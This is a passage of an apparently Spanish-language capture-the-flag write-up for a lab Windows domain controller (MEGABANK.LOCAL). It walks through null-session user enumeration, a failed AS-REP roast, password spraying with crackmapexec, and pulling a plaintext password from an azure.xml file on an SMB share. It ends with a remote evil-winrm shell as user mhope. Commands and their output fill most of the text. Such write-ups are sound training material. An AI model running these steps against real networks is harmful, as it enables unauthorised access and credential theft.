<ul>
  <li>Vemos que la maquina tiene el servicio <strong>RPC</strong> así que podemos usar la herramienta <code class="language-plaintext highlighter-rouge">rpcclient</code> para enumerar este servicio empleando un <code class="language-plaintext highlighter-rouge">Null Session</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.129.228.111
rpcclient <span class="nv">$&gt;</span> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
</code></pre></div></div>

<ul>
  <li>Como podemos enumerar usuarios del dominio vamos añadirlos a una lista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.129.228.111 <span class="nt">-c</span> enumdomusers | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[\D*?\]'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> users.txt
➜  content <span class="nb">cat </span>users.txt
Guest
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
</code></pre></div></div>

<ul>
  <li>Como tenemos una lista de usuarios podemos probar con un <code class="language-plaintext highlighter-rouge">ASREPRoast</code> <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers MEGABANK.LOCAL/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
</code></pre></div></div>

<ul>
  <li>
    <p>Bueno como tal el ataque fallo y ningún usuario tiene configurado el UF_DONT_REQUIRE_PREAUTH <a href="https://learn.microsoft.com/es-es/windows/win32/api/lmaccess/ns-lmaccess-user_info_23">https://learn.microsoft.com/es-es/windows/win32/api/lmaccess/ns-lmaccess-user_info_23</a>.</p>
  </li>
  <li>
    <p>Bueno nos volveremos a conectar con <code class="language-plaintext highlighter-rouge">rpcclient</code> para enumerar mas usando el servicio.</p>
  </li>
  <li>
    <p>Estos son los grupos del dominio.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.129.228.111
rpcclient <span class="nv">$&gt;</span> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]
</code></pre></div></div>

<ul>
  <li>Pero bueno poca cosa vamos a poder hacer.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nv">$&gt;</span> querydispinfo
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account <span class="k">for </span>the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Built-in account <span class="k">for </span>guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O<span class="s1">'Leary	Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)
</span></code></pre></div></div>

<h2 id="shell-as-mhope">Shell as mhope</h2>

<ul>
  <li>Bueno tenemos un listado potencial de usuarios algo que podemos hacer es un <strong>Password Spray</strong> esto consiste en ver si algún usuario usa su nombre de usuario como contraseña para eso usaremos la herramienta de <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.228.111 <span class="nt">-u</span> users.txt <span class="nt">-p</span> users.txt <span class="nt">--continue-on-success</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:SABatchJobs
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:smorgan STATUS_LOGON_FAILURE
</code></pre></div></div>

<ul>
  <li>Con esto comprobamos que las credenciales son correctas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.228.111 <span class="nt">-u</span> SABatchJobs <span class="nt">-p</span> <span class="s1">'SABatchJobs'</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:SABatchJobs
</code></pre></div></div>

<ul>
  <li>Vemos que tenemos acceso de lectura a varios recursos a nivel de red uno que se ve interesante por el nombre es el de <code class="language-plaintext highlighter-rouge">users$</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.228.111 <span class="nt">-u</span> SABatchJobs <span class="nt">-p</span> <span class="s1">'SABatchJobs'</span> <span class="nt">--shares</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:SABatchJobs
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] Enumerated shares
SMB         10.129.228.111  445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.228.111  445    MONTEVERDE       <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.129.228.111  445    MONTEVERDE       ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.129.228.111  445    MONTEVERDE       azure_uploads   READ
SMB         10.129.228.111  445    MONTEVERDE       C<span class="nv">$ </span>                             Default share
SMB         10.129.228.111  445    MONTEVERDE       E<span class="nv">$ </span>                             Default share
SMB         10.129.228.111  445    MONTEVERDE       IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.129.228.111  445    MONTEVERDE       NETLOGON        READ            Logon server share
SMB         10.129.228.111  445    MONTEVERDE       SYSVOL          READ            Logon server share
SMB         10.129.228.111  445    MONTEVERDE       <span class="nb">users</span><span class="nv">$ </span>         READ
</code></pre></div></div>

<ul>
  <li>Vamos a enumerar ese recurso compartido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbclient <span class="nt">-U</span> SABatchJobs //10.129.228.111/users<span class="err">$</span>
Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\S</span>ABatchJobs]:
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Fri Jan  3 07:12:48 2020
  ..                                  D        0  Fri Jan  3 07:12:48 2020
  dgalanos                            D        0  Fri Jan  3 07:12:30 2020
  mhope                               D        0  Fri Jan  3 07:41:18 2020
  roleary                             D        0  Fri Jan  3 07:10:30 2020
  smorgan                             D        0  Fri Jan  3 07:10:24 2020

		31999 blocks of size 4096. 28979 blocks available
smb: <span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vemos un archivo llamado <strong>azure.xml</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\m</span>hope<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Fri Jan  3 07:41:18 2020
  ..                                  D        0  Fri Jan  3 07:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 07:40:23 2020

		31999 blocks of size 4096. 28979 blocks available
smb: <span class="se">\m</span>hope<span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vamos a descárgalo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\m</span>hope<span class="se">\&gt;</span> get azure.xml
getting file <span class="se">\m</span>hope<span class="se">\a</span>zure.xml of size 1212 as azure.xml <span class="o">(</span>3.3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 3.3 KiloBytes/sec<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Si examinamos el archivo encontramos una contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>azure.xml
&lt;Objs <span class="nv">Version</span><span class="o">=</span><span class="s2">"1.1.0.1"</span> <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.microsoft.com/powershell/2004/04"</span><span class="o">&gt;</span>
  &lt;Obj <span class="nv">RefId</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>
    &lt;TN <span class="nv">RefId</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>
      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;
      &lt;T&gt;System.Object&lt;/T&gt;
    &lt;/TN&gt;
    &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;
    &lt;Props&gt;
      &lt;DT <span class="nv">N</span><span class="o">=</span><span class="s2">"StartDate"</span><span class="o">&gt;</span>2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
      &lt;DT <span class="nv">N</span><span class="o">=</span><span class="s2">"EndDate"</span><span class="o">&gt;</span>2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
      &lt;G <span class="nv">N</span><span class="o">=</span><span class="s2">"KeyId"</span><span class="o">&gt;</span>00000000-0000-0000-0000-000000000000&lt;/G&gt;
      &lt;S <span class="nv">N</span><span class="o">=</span><span class="s2">"Password"</span><span class="o">&gt;</span>4n0therD4y@n0th3r<span class="nv">$&lt;</span>/S&gt;
    &lt;/Props&gt;
  &lt;/Obj&gt;
&lt;/Objs&gt;
</code></pre></div></div>

<ul>
  <li>Como ahora tenemos una contraseña nueva lo que podemos hacer básicamente es hacer otro <code class="language-plaintext highlighter-rouge">Password Spray</code> para ver si algún usuario utiliza la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.228.111 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'4n0therD4y@n0th3r$'</span> <span class="nt">--continue-on-success</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\m</span>hope:4n0therD4y@n0th3r<span class="err">$</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
</code></pre></div></div>

<ul>
  <li>Podemos emplear <code class="language-plaintext highlighter-rouge">evil-winrm</code> gracias a que nos devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code> y el usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Windows Remote Management</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.228.111 <span class="nt">-u</span> mhope <span class="nt">-p</span> 4n0therD4y@n0th3r<span class="err">$</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>megabank<span class="se">\m</span>hope
</code></pre></div></div>

<h1 id="usertxt">user.txt</h1>

<ul>
  <li>Ahora ya podemos leer la flag.</li>
</ul>

